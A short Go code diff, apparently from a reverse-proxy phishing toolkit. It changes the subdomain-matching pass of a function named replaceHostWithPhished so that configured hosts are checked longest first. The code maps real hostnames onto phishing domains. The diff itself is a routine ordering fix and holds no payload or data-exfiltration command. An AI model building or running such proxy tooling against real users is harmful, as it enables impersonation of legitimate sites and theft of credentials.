@@ -1248,7 +1248,17 @@ func (m *ProxyHandler) replaceHostWithPhished(hostname string, config map[string
 	}
 
 	// second pass: look for subdomain matches
-	for originalHost, hostConfig := range config {
+	// sort keys by length (longest first) to ensure most specific matches are checked first
+	var sortedHosts []string
+	for originalHost := range config {
+		sortedHosts = append(sortedHosts, originalHost)
+	}
+	sort.Slice(sortedHosts, func(i, j int) bool {
+		return len(sortedHosts[i]) > len(sortedHosts[j])
+	})
+
+	for _, originalHost := range sortedHosts {
+		hostConfig := config[originalHost]
 		if strings.HasSuffix(strings.ToLower(hostname), "."+strings.ToLower(originalHost)) {
 			// use case-insensitive trimming to handle mixed case properly
 			lowerHostname := strings.ToLower(hostname)
